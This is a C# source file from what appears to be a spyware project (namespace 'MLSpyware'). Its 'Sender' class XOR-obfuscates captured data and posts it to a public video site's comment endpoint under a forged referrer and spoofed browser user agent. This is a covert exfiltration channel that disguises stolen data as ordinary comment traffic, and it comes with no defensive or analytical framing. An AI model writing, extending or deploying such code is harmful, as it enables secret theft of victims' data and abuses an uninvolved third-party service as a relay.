using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Net.Http;
using System.Linq;


namespace MLSpyware
{
    public class Sender
    {
            private string cryptdata;
            string key = "";

            public Sender(string data, string key)
            {
                this.key = key;
                cryptdata = StrEncrypt(data);
            }


            public string StrEncrypt(string txt)
            {
                int[] enctoret = new int[txt.Length];

                for (int i = 0; i < txt.Length; i++)
                {
                    enctoret[i] = (txt[i] ^ key[i]);

                }
                return string.Join("-", enctoret.Select(x => x.ToString()).ToArray());
            }

            public string StrDecrypt(string txt)
            {

                int[] intArray = txt.Split(new[] { '-' }, StringSplitOptions.RemoveEmptyEntries).Select(int.Parse).ToArray();
                for (int i = 0; i < intArray.Length - 1; i++)
                {
                    Console.WriteLine(intArray[i]);
                }
                char[] enctoret = new char[intArray.Length];

                for (int i = 0; i < intArray.Length; i++)
                {
                    enctoret[i] = (char)(intArray[i] ^ key[i]);

                }

                return new string(enctoret);
            }

            public async Task<HttpResponseMessage> sendtoCDA(string videourl)
            {
                HttpClient client = new HttpClient();

                var values = new Dictionary<string, string>
                {
                    { "t", cryptdata}
                };

                var content = new FormUrlEncodedContent(values);
                client.DefaultRequestHeaders.Referrer = new Uri(videourl);
                client.DefaultRequestHeaders.UserAgent.TryParseAdd(@"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0");

                return await client.PostAsync("https://www.cda.pl/a/comment", content);

            }


    }

}

